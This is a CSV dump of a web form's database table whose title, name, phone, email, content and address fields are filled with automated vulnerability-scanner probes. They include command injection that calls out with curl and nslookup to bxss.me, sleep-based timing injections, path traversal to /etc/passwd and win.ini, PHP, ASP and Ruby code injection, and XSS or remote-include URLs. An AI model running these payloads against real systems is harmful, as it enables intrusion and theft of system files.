id,Title,linkren,phone,mobile,fax,email,content,date,address,state,statedate,prodid
2089,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs,0,,0
2090,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,HttP://bxss.me/t/xss.html?%00,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2091,Mr.,+response.write(9747311*9935728)+,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2093,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2094,Mr.,pHqghUme,555-666-0606,987-65-4329,),testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2096,Mr.,pHqghUme,555-666-0606,987-65-4329,../../../../../../../../../../../../../../windows/win.ini,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2097,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,"&quot;+&quot;A&quot;.concat(70-3).concat(22*4).concat(106).concat(90).concat(114).concat(83)+(require&quot;socket&quot;
Socket.gethostbyname(&quot;hitus&quot;+&quot;hqxphxea47e60.bxss.me.&quot;)[3].to_s)+&quot;",0,,0
2098,Mr.,12345&quot;\\&quot;)ÿ|]*,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2099,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2100,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,bxss.me/t/xss.html?%00,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2101,Mr.,&quot;+response.write(9747311*9935728)+&quot;,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2103,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2104,Mr.,pHqghUme,555-666-0606,987-65-4329,!(()&amp;&amp;!|*|*|,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2105,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,Http://bxss.me/t/fit.txt,0,,0
2106,Mr.,pHqghUme,555-666-0606,987-65-4329,file:///etc/passwd,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2107,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,echo vvuoii$()\ oejulr\nz^xyu||a # &amp;echo vvuoii$()\ oejulr\nz^xyu||a #|&quot; &amp;echo vvuoii$()\ oejulr\nz^xyu||a #,0,,0
2108,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2109,Mr.,pHqghUme,555-666-0606,987-65-4329,^(#$!@#$)(()))******,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2110,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,"+A.concat(70-3).concat(22*4).concat(106).concat(87).concat(105).concat(89)+(requiresocket
Socket.gethostbyname(hitfi+trudjytibbe98.bxss.me.)[3].to_s)+",0,,0
2111,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,http://bxss.me/t/fit.txt?.jpg,0,,0
2112,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,HttP://bxss.me/t/xss.html?%00,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2113,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2114,Mr.,pHqghUme,response.write(9978231*9140578),987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2115,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,&amp;echo okowct$()\ hjranx\nz^xyu||a # &amp;echo okowct$()\ hjranx\nz^xyu||a #|&quot; &amp;echo okowct$()\ hjranx\nz^xyu||a #,0,,0
2116,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2117,Mr.,pHqghUme,555-666-0606,),317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2118,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,"&quot;+&quot;A&quot;.concat(70-3).concat(22*4).concat(98).concat(87).concat(109).concat(85)+(require&quot;socket&quot;
Socket.gethostbyname(&quot;hitac&quot;+&quot;xcnmjjwr98e3f.bxss.me.&quot;)[3].to_s)+&quot;",2024-04-18 00:00:00,3137 Laguna Street,0,,0
2119,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,/etc/shells,0,,0
2120,&quot;(),pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2121,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,bxss.me/t/xss.html?%00,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2122,Mr.,pHqghUme,555-666-0606,987-65-4329,../317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2123,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,|echo uzhsmx$()\ mbucqx\nz^xyu||a # |echo uzhsmx$()\ mbucqx\nz^xyu||a #|&quot; |echo uzhsmx$()\ mbucqx\nz^xyu||a #,0,,0
2124,ÿassert(base64_decode(cHJpbnQobWQ1KDMxMzM3KSk7))ÿ,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2125,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,"+A.concat(70-3).concat(22*4).concat(122).concat(80).concat(98).concat(76)+(requiresocket
Socket.gethostbyname(hitsi+jxgkdlel4a156.bxss.me.)[3].to_s)+",2024-04-18 00:00:00,3137 Laguna Street,0,,0
2126,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,c:/windows/win.ini,0,,0
2127,Mr.,pHqghUme,12345&quot;\\&quot;)ÿ|]*,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2128,Mr.,pHqghUme,+response.write(9978231*9140578)+,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2129,Mr.&amp;&amp;sleep(27*1000)*lhmbvd&amp;&amp;,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2130,Mr.,pHqghUme,555-666-0606,../../../../../../../../../../../../../../etc/passwd,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2131,Mr.,pHqghUme,555-666-0606,!(()&amp;&amp;!|*|*|,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2132,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2133,ÿprint(md5(31337))ÿ$a=,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2135,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,bxss.me,0,,0
2136,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,(nslookup -q=cname hitatkycmliof043e7.bxss.me||curl hitatkycmliof043e7.bxss.me)),0,,0
2137,Mr.&quot;&amp;&amp;sleep(27*1000)*hwvsvx&amp;&amp;&quot;,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2138,Mr.,pHqghUme,555-666-0606,../../../../../../../../../../../../../../windows/win.ini,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2139,Mr.,pHqghUme,555-666-0606,^(#$!@#$)(()))******,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2140,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2141,&quot;ÿprint(md5(31337))ÿ$a=&quot;,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2143,Mr.,pHqghUme,&quot;+response.write(9978231*9140578)+&quot;,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2144,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs?.jpg,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2145,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,$(nslookup -q=cname hitzprlkrpduid146d.bxss.me||curl hitzprlkrpduid146d.bxss.me),0,,0
2146,Mr.||sleep(27*1000)*pkbdih||,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2147,Mr.,pHqghUme,555-666-0606,file:///etc/passwd,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2148,Mr.,),555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2149,Mr.,pHqghUme,555-666-0606,987-65-4329,HttP://bxss.me/t/xss.html?%00,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2150,${@print(md5(31337))},pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2152,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2153,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,&amp;nslookup -q=cname hitjpswaizkki9fce2.bxss.me&amp;\&quot;`0&amp;nslookup -q=cname hitjpswaizkki9fce2.bxss.me&amp;`,0,,0
2154,Mr.&quot;||sleep(27*1000)*wwnmeh||&quot;,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2155,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2156,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2157,Mr.,!(()&amp;&amp;!|*|*|,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2158,${@print(md5(31337))}\,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2160,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,Http://bxss.me/t/fit.txt,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2161,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,&amp;(nslookup -q=cname hitrkdpcquqod88964.bxss.me||curl hitrkdpcquqod88964.bxss.me)&amp;\&quot;`0&amp;(nslookup -q=cname hitrkdpcquqod88964.bxss.me||curl hitrkdpcquqod88964.bxss.me)&amp;`,0,,0
2162,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,,0,,0
2163,prodMsg.asp,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2164,Mr.,pHqghUme,555-666-0606,../987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2165,Mr.,^(#$!@#$)(()))******,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2166,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2167,.print(md5(31337)).,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2169,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,http://bxss.me/t/fit.txt?.jpg,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2170,Mr.,pHqghUme,555-666-0606,987-65-4329,bxss.me/t/xss.html?%00,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2171,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,|(nslookup -q=cname hitwcopyswdys7def2.bxss.me||curl hitwcopyswdys7def2.bxss.me),0,,0
2172,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2173,Mr.,../../../../../../../../../../../../../../etc/passwd,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2174,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2175,Mr.,pHqghUme,),987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2176,))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))),pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2177,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,；assert(base64_decode(cHJpbnQobWQ1KDMxMzM3KSk7))；,0,,0
2178,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,/etc/shells,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2179,Mr.,pHqghUme,555-666-0606,HttP://bxss.me/t/xss.html?%00,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2180,prodMsg.asp,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2181,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,,0,,0
2182,Mr.,../../../../../../../../../../../../../../windows/win.ini,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2183,Mr.,pHqghUme,!(()&amp;&amp;!|*|*|,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2184,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))),0,,0
2186,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,ÿprint(md5(31337))ÿ$a=,0,,0
2187,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,c:/windows/win.ini,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2188,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,`(nslookup -q=cname hitxnpncgbkhcda138.bxss.me||curl hitxnpncgbkhcda138.bxss.me)`,0,,0
2189,Mr.,file:///etc/passwd,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2190,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))),2024-04-18 00:00:00,3137 Laguna Street,0,,0
2192,Mr.,pHqghUme,555-666-0606,bxss.me/t/xss.html?%00,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2193,xfs.bxss.me,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2194,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,,0,,0
2195,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,bxss.me,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2196,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2197,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))),555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2199,prodMsg.asp/.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2200,Mr.,HttP://bxss.me/t/xss.html?%00,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2201,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,xfs.bxss.me,0,,0
2202,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,；(nslookup -q=cname hitrxoguwwaxwb1745.bxss.me||curl hitrxoguwwaxwb1745.bxss.me)|(nslookup -q=cname hitrxoguwwaxwb1745.bxss.me||curl hitrxoguwwaxwb1745.bxss.me)&amp;(nslookup -q=cname hitrxoguwwaxwb1745.bxss.me||curl hitrxoguwwaxwb1745.bxss.me),0,,0
2203,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2204,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs?.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2205,Mr.,pHqghUme,555-666-0606,987-65-4329,))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))),testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2206,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,&quot;；print(md5(31337))；$a=&quot;,0,,0
2208,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,prodMsg.asp,0,,0
2209,Mr.,pHqghUme,^(#$!@#$)(()))******,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2210,Mr.,bxss.me/t/xss.html?%00,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2211,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,&quot;(),0,,0
2212,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,xfs.bxss.me,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2213,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2214,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2215,Mr.,pHqghUme,555-666-0606,))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))),317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2217,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,echo fxhaey$()\ vhmlaj\nz^xyu||a # &amp;echo fxhaey$()\ vhmlaj\nz^xyu||a #|&quot; &amp;echo fxhaey$()\ vhmlaj\nz^xyu||a #,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2218,Mr.,pHqghUme,HttP://bxss.me/t/xss.html?%00,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2219,Mr.,../pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2220,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,xfs.bxss.me,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2221,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,${@print(md5(31337))},0,,0
2222,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,Http://bxss.me/t/fit.txt,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2223,Mr.,))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))),555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2224,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,prodMsg.asp,0,,0
2225,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2226,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street&amp;&amp;sleep(27*1000)*uceppj&amp;&amp;,0,,0
2227,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,&amp;echo bggcua$()\ rmsyjw\nz^xyu||a # &amp;echo bggcua$()\ rmsyjw\nz^xyu||a #|&quot; &amp;echo bggcua$()\ rmsyjw\nz^xyu||a #,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2228,Mr.,pHqghUme,bxss.me/t/xss.html?%00,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2229,&quot;,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2230,Mr.,pHqghUme,../../../../../../../../../../../../../../etc/passwd,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2231,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,${@print(md5(31337))}\,0,,0
2232,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,http://bxss.me/t/fit.txt?.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2233,Mr.,pHqghUme,))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))),987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2234,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2235,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street&quot;&amp;&amp;sleep(27*1000)*ifrrti&amp;&amp;&quot;,0,,0
2236,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,|echo dbsiwn$()\ eemdjf\nz^xyu||a # |echo dbsiwn$()\ eemdjf\nz^xyu||a #|&quot; |echo dbsiwn$()\ eemdjf\nz^xyu||a #,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2237,Mr.,pHqghUme,555-666-0606,987-65-4329,xfs.bxss.me,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2238,Mr.,pHqghUme,../../../../../../../../../../../../../../windows/win.ini,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,3137 Laguna Street,0,,0
2239,Mr.,pHqghUme,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-04-18 00:00:00,.print(md5(31337)).,0,,0
